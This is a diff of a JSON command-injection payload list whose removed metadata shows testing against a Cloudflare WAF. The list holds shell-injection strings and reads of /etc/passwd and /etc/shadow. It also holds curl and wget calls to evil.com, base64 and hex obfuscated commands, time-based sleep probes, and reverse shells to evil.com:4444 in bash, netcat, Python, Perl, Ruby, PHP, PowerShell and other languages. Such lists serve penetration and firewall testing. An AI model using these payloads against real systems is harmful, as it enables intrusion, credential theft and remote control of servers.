@@ -1,22 +1,8 @@
 {
   "category": "command_injection",
   "subcategory": "comprehensive",
-  "count": 115,
+  "count": 108,
   "payloads": [
-    {
-      "id": "cmdi-3001",
-      "category": "command_injection",
-      "subcategory": "comprehensive",
-      "payload": "; ls",
-      "description": "Semicolon ls",
-      "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
     {
       "id": "cmdi-3002",
       "category": "command_injection",
@@ -24,12 +10,7 @@
       "payload": "; pwd",
       "description": "Semicolon pwd",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3003",
@@ -38,26 +19,7 @@
       "payload": "; whoami",
       "description": "Semicolon whoami",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "cmdi-3004",
-      "category": "command_injection",
-      "subcategory": "comprehensive",
-      "payload": "; id",
-      "description": "Semicolon id",
-      "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3005",
@@ -66,26 +28,7 @@
       "payload": "; uname -a",
       "description": "Semicolon uname",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "cmdi-3006",
-      "category": "command_injection",
-      "subcategory": "comprehensive",
-      "payload": "| ls",
-      "description": "Pipe ls",
-      "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3007",
@@ -94,12 +37,7 @@
       "payload": "| pwd",
       "description": "Pipe pwd",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3008",
@@ -108,26 +46,7 @@
       "payload": "| whoami",
       "description": "Pipe whoami",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "cmdi-3009",
-      "category": "command_injection",
-      "subcategory": "comprehensive",
-      "payload": "| id",
-      "description": "Pipe id",
-      "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3010",
@@ -136,26 +55,7 @@
       "payload": "| uname -a",
       "description": "Pipe uname",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "cmdi-3011",
-      "category": "command_injection",
-      "subcategory": "comprehensive",
-      "payload": "& ls",
-      "description": "Ampersand ls",
-      "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3012",
@@ -164,12 +64,7 @@
       "payload": "& pwd",
       "description": "Ampersand pwd",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3013",
@@ -178,12 +73,7 @@
       "payload": "& whoami",
       "description": "Ampersand whoami",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3014",
@@ -192,12 +82,7 @@
       "payload": "&& ls",
       "description": "Double ampersand ls",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3015",
@@ -206,12 +91,7 @@
       "payload": "&& pwd",
       "description": "Double ampersand pwd",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3016",
@@ -220,12 +100,7 @@
       "payload": "|| ls",
       "description": "Double pipe ls",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3017",
@@ -234,26 +109,7 @@
       "payload": "|| pwd",
       "description": "Double pipe pwd",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "cmdi-3018",
-      "category": "command_injection",
-      "subcategory": "comprehensive",
-      "payload": "`ls`",
-      "description": "Backtick ls",
-      "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3019",
@@ -262,12 +118,7 @@
       "payload": "`pwd`",
       "description": "Backtick pwd",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3020",
@@ -276,12 +127,7 @@
       "payload": "`whoami`",
       "description": "Backtick whoami",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3021",
@@ -290,12 +136,7 @@
       "payload": "$(ls)",
       "description": "Dollar paren ls",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3022",
@@ -304,12 +145,7 @@
       "payload": "$(pwd)",
       "description": "Dollar paren pwd",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3023",
@@ -318,12 +154,7 @@
       "payload": "$(whoami)",
       "description": "Dollar paren whoami",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3024",
@@ -332,12 +163,7 @@
       "payload": "$(id)",
       "description": "Dollar paren id",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3025",
@@ -346,12 +172,7 @@
       "payload": "$(uname -a)",
       "description": "Dollar paren uname",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3026",
@@ -360,12 +181,7 @@
       "payload": "$(cat /etc/passwd)",
       "description": "Dollar paren cat passwd",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3027",
@@ -374,12 +190,7 @@
       "payload": "$(cat /etc/shadow)",
       "description": "Dollar paren cat shadow",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3028",
@@ -388,12 +199,7 @@
       "payload": "$(cat /etc/hosts)",
       "description": "Dollar paren cat hosts",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3029",
@@ -402,12 +208,7 @@
       "payload": "`cat /etc/passwd`",
       "description": "Backtick cat passwd",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3030",
@@ -416,12 +217,7 @@
       "payload": "`cat /etc/shadow`",
       "description": "Backtick cat shadow",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3031",
@@ -430,12 +226,7 @@
       "payload": "`cat /etc/hosts`",
       "description": "Backtick cat hosts",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3032",
@@ -444,12 +235,7 @@
       "payload": "$(curl http://evil.com)",
       "description": "Dollar paren curl",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3033",
@@ -458,12 +244,7 @@
       "payload": "$(wget http://evil.com)",
       "description": "Dollar paren wget",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3034",
@@ -472,12 +253,7 @@
       "payload": "`curl http://evil.com`",
       "description": "Backtick curl",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3035",
@@ -486,12 +262,7 @@
       "payload": "`wget http://evil.com`",
       "description": "Backtick wget",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3036",
@@ -500,12 +271,7 @@
       "payload": "$(nc -e /bin/sh evil.com 4444)",
       "description": "Dollar paren netcat",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3037",
@@ -514,12 +280,7 @@
       "payload": "`nc -e /bin/sh evil.com 4444`",
       "description": "Backtick netcat",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3038",
@@ -528,12 +289,7 @@
       "payload": "$(python -c 'import os;os.system(\"ls\")')",
       "description": "Dollar paren python",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3039",
@@ -542,12 +298,7 @@
       "payload": "$(perl -e 'system(\"ls\")')",
       "description": "Dollar paren perl",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3040",
@@ -556,12 +307,7 @@
       "payload": "$(ruby -e 'system(\"ls\")')",
       "description": "Dollar paren ruby",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3041",
@@ -570,12 +316,7 @@
       "payload": "; bash -i >& /dev/tcp/evil.com/4444 0>&1",
       "description": "Bash reverse shell",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3042",
@@ -584,12 +325,7 @@
       "payload": "; bash -c 'bash -i >& /dev/tcp/evil.com/4444 0>&1'",
       "description": "Bash -c reverse shell",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3043",
@@ -598,12 +334,7 @@
       "payload": "; nc -e /bin/sh evil.com 4444",
       "description": "Netcat -e",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3044",
@@ -612,12 +343,7 @@
       "payload": "; nc -c /bin/sh evil.com 4444",
       "description": "Netcat -c",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3045",
@@ -626,12 +352,7 @@
       "payload": "; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc evil.com 4444 >/tmp/f",
       "description": "Netcat mkfifo",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3046",
@@ -640,12 +361,7 @@
       "payload": "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
       "description": "Python reverse shell",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3047",
@@ -654,12 +370,7 @@
       "payload": "; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
       "description": "Python3 reverse shell",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3048",
@@ -668,12 +379,7 @@
       "payload": "; perl -e 'use Socket;$i=\"evil.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
       "description": "Perl reverse shell",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3049",
@@ -682,12 +388,7 @@
       "payload": "; ruby -rsocket -e'f=TCPSocket.open(\"evil.com\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
       "description": "Ruby reverse shell",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3050",
@@ -696,12 +397,7 @@
       "payload": "; php -r '$sock=fsockopen(\"evil.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
       "description": "PHP reverse shell",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3051",
@@ -710,12 +406,7 @@
       "payload": "; socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:evil.com:4444",
       "description": "Socat reverse shell",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3052",
@@ -724,12 +415,7 @@
       "payload": "; awk 'BEGIN {s = \"/inet/tcp/0/evil.com/4444\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
       "description": "AWK reverse shell",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3053",
@@ -738,12 +424,7 @@
       "payload": "; telnet evil.com 4444 | /bin/sh",
       "description": "Telnet reverse shell",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3054",
@@ -752,12 +433,7 @@
       "payload": "; mknod backpipe p && telnet evil.com 4444 0<backpipe | /bin/bash 1>backpipe",
       "description": "Telnet mknod",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3055",
@@ -766,12 +442,7 @@
       "payload": "; lua -e \"require('socket');require('os');t=socket.tcp();t:connect('evil.com','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
       "description": "Lua reverse shell",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3056",
@@ -780,12 +451,7 @@
       "payload": "; nodejs -e \"require('child_process').exec('bash -i >& /dev/tcp/evil.com/4444 0>&1')\"",
       "description": "NodeJS reverse shell",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3057",
@@ -794,12 +460,7 @@
       "payload": "; powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('evil.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
       "description": "PowerShell reverse shell",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3058",
@@ -808,12 +469,7 @@
       "payload": "; java -jar reverse.jar evil.com 4444",
       "description": "Java reverse shell",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3059",
@@ -822,12 +478,7 @@
       "payload": "; xterm -display evil.com:1",
       "description": "Xterm reverse shell",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3060",
@@ -836,12 +487,7 @@
       "payload": "; ncat evil.com 4444 -e /bin/bash",
       "description": "Ncat reverse shell",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3061",
@@ -850,12 +496,7 @@
       "payload": "; $(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)",
       "description": "Base64 cat passwd",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3062",
@@ -864,12 +505,7 @@
       "payload": "; `echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`",
       "description": "Backtick base64",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3063",
@@ -878,12 +514,7 @@
       "payload": "; $(echo 'cat /etc/passwd' | base64 -d)",
       "description": "Base64 decode cat",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3064",
@@ -892,12 +523,7 @@
       "payload": "; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh",
       "description": "Base64 pipe sh",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3065",
@@ -906,12 +532,7 @@
       "payload": "; printf '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64' | sh",
       "description": "Hex encoded cat",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3066",
@@ -920,12 +541,7 @@
       "payload": "; echo -e '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64' | sh",
       "description": "Echo hex cat",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3067",
@@ -934,12 +550,7 @@
       "payload": "; echo 636174202f6574632f706173737764 | xxd -r -p | sh",
       "description": "Hex xxd cat",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3068",
@@ -948,12 +559,7 @@
       "payload": "; perl -e 'system(\"cat /etc/passwd\")'",
       "description": "Perl system",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3069",
@@ -962,12 +568,7 @@
       "payload": "; python -c 'import os;os.system(\"cat /etc/passwd\")'",
       "description": "Python os.system",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3070",
@@ -976,12 +577,7 @@
       "payload": "; ruby -e 'system(\"cat /etc/passwd\")'",
       "description": "Ruby system",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3071",
@@ -990,12 +586,7 @@
       "payload": "; php -r 'system(\"cat /etc/passwd\");'",
       "description": "PHP system",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3072",
@@ -1004,12 +595,7 @@
       "payload": "; node -e 'require(\"child_process\").exec(\"cat /etc/passwd\")'",
       "description": "Node exec",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3073",
@@ -1018,12 +604,7 @@
       "payload": "; lua -e 'os.execute(\"cat /etc/passwd\")'",
       "description": "Lua execute",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3074",
@@ -1032,12 +613,7 @@
       "payload": "; awk 'BEGIN {system(\"cat /etc/passwd\")}'",
       "description": "AWK system",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3075",
@@ -1046,12 +622,7 @@
       "payload": "; find . -exec cat /etc/passwd \\;",
       "description": "Find exec",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3076",
@@ -1060,12 +631,7 @@
       "payload": "; xargs -I {} cat /etc/passwd",
       "description": "Xargs cat",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3077",
@@ -1074,12 +640,7 @@
       "payload": "; timeout 1 cat /etc/passwd",
       "description": "Timeout cat",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3078",
@@ -1088,12 +649,7 @@
       "payload": "; nice cat /etc/passwd",
       "description": "Nice cat",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3079",
@@ -1102,12 +658,7 @@
       "payload": "; nohup cat /etc/passwd &",
       "description": "Nohup cat",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3080",
@@ -1116,12 +667,7 @@
       "payload": "; setsid cat /etc/passwd",
       "description": "Setsid cat",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3081",
@@ -1130,12 +676,7 @@
       "payload": "; sleep 5",
       "description": "Sleep 5",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3082",
@@ -1144,12 +685,7 @@
       "payload": "; sleep 10",
       "description": "Sleep 10",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3083",
@@ -1158,12 +694,7 @@
       "payload": "; ping -c 5 127.0.0.1",
       "description": "Ping 5",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3084",
@@ -1172,12 +703,7 @@
       "payload": "; ping -c 10 127.0.0.1",
       "description": "Ping 10",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3085",
@@ -1186,12 +712,7 @@
       "payload": "; timeout 5 sleep 10",
       "description": "Timeout sleep",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3086",
@@ -1200,12 +721,7 @@
       "payload": "; perl -e 'sleep 5'",
       "description": "Perl sleep",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "cmdi-3087",
@@ -1214,12 +730,7 @@
       "payload": "; python -c 'import time;time.sleep(5)'",
       "description": "Python sleep",
       "technique": "command_injection",
-      "source": "generated_massive",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
